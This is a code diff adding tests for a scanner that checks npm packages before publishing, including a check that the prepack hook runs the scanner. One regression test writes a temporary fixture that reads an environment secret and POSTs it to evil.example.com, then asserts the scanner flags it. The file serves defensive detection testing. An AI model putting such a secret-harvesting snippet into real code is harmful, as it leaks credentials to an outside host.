@@ -1,7 +1,10 @@
-import { describe, it, expect } from 'vitest'
-import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
+import { describe, it, expect, afterAll } from 'vitest'
+import { mkdtempSync, writeFileSync, mkdirSync, readFileSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
-import { join } from 'node:path'
+import { join, resolve } from 'node:path'
+import { fileURLToPath } from 'node:url'
+
+const REPO_ROOT = resolve(fileURLToPath(import.meta.url), '..', '..', '..')
 
 // scripts/scan-tarball.mjs is .mjs (no .d.ts companion). Vitest + jiti import
 // it as ESM at runtime; the cast to a typed shape keeps the per-test
@@ -59,6 +62,47 @@ describe('scanner-check (Phase 03 D-04 acceptance bar half 1)', () => {
       line: f.line,
     }))
     expect(summarized).toEqual([])
+  })
+
+  it('package.json prepack invokes scripts/scan-tarball.mjs', () => {
+    // Regression net: silently dropping the chain (e.g., during a future
+    // build-script edit) would let `npm publish` ship critical findings.
+    const pkg = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf-8'))
+    expect(pkg.scripts?.prepack).toMatch(/\bnode scripts\/scan-tarball\.mjs\b/)
+  })
+
+  it('regression net: poisoned file inside the published tree raises critical', async () => {
+    // Codifies the manual negative-path proof from Phase 03 Plan 02. If a
+    // future change weakens scanPublishedFiles (e.g., resolver returns a
+    // wrong scanner, walk skips a published dir), this asserts that an
+    // env-harvesting pattern in src/ is still caught against the REAL
+    // published file set, not just a tmpdir.
+    const harvesterPath = join(REPO_ROOT, 'src', '__scan_regression_DO_NOT_COMMIT__.tmp.ts')
+    writeFileSync(
+      harvesterPath,
+      [
+        'export async function harvest() {',
+        '  const secret = process.env.MY_SECRET',
+        '  await fetch("https://evil.example.com", { method: "POST", body: secret })',
+        '}',
+      ].join('\n'),
+      'utf-8',
+    )
+    try {
+      const summary = await scanPublishedFiles()
+      expect(summary.critical).toBeGreaterThanOrEqual(1)
+      const envHarvest = summary.findings.find(
+        (f) => f.ruleId === 'env-harvesting' && f.file.includes('__scan_regression_DO_NOT_COMMIT__'),
+      )
+      expect(envHarvest).toBeDefined()
+    } finally {
+      rmSync(harvesterPath, { force: true })
+    }
+  })
+
+  // Defensive cleanup in case a prior crashed run left the fixture in src/.
+  afterAll(() => {
+    rmSync(join(REPO_ROOT, 'src', '__scan_regression_DO_NOT_COMMIT__.tmp.ts'), { force: true })
   })
 
   it('positive control: scanner detects env-harvesting when present', async () => {
